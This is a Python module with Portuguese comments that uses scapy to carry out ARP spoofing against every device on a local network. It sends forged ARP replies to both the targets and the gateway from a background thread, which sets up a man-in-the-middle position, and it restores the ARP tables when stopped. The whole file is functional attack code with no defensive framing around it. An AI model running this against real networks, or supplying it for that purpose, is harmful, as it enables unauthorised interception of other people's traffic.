import time
import threading
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

# Fix #3: Event global para controlar a thread de spoofing ativa
_stop_event = threading.Event()
_spoof_thread: threading.Thread = None


def get_mac(ip: str) -> str:
    """Pega o MAC de um IP via ARP."""
    from scapy.all import srp
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(packet, timeout=3, verbose=False)[0]
    if result:
        return result[0][1].hwsrc
    return None


def spoof(target_ip: str, spoof_ip: str, target_mac: str, local_mac: str, interface: str):
    """
    Envia ARP falso para o target dizendo que somos o spoof_ip.
    Fix #10: local_mac é passado como argumento (cacheado pelo caller).
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=local_mac,
    )
    sendp(packet, iface=interface, verbose=False)


def restore(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str, interface: str):
    """Restaura as tabelas ARP originais ao parar."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
    )
    sendp(packet, iface=interface, count=5, verbose=False)


def start_spoofing(devices: list, gateway_ip: str, interface: str):
    """
    Inicia o ARP spoofing em background para todos os dispositivos.
    Fix #3: para a thread anterior antes de criar uma nova.
    Fix #10: cacheia MACs da interface e do gateway uma única vez.
    """
    global _stop_event, _spoof_thread

    # Para thread anterior, se existir
    if _spoof_thread and _spoof_thread.is_alive():
        _stop_event.set()
        _spoof_thread.join(timeout=5)

    _stop_event = threading.Event()

    gateway_mac = get_mac(gateway_ip)
    local_mac = get_if_hwaddr(interface)  # Fix #10: cacheado aqui, não por pacote

    targets = [
        {"ip": device["ip"], "mac": device["mac"]}
        for device in devices
        if device["ip"] != gateway_ip
    ]

    def loop():
        while not _stop_event.is_set():
            for target in targets:
                if _stop_event.is_set():
                    break
                # Engana o dispositivo: "eu sou o roteador"
                spoof(target["ip"], gateway_ip, target["mac"], local_mac, interface)
                # Engana o roteador: "eu sou o dispositivo"
                spoof(gateway_ip, target["ip"], gateway_mac, local_mac, interface)
            _stop_event.wait(timeout=2)

        # Ao parar, restaura tudo
        for target in targets:
            restore(target["ip"], gateway_ip, target["mac"], gateway_mac, interface)

    _spoof_thread = threading.Thread(target=loop, daemon=True)
    _spoof_thread.start()


def stop_spoofing():
    """Para o loop de spoofing de forma limpa."""
    global _stop_event
    _stop_event.set()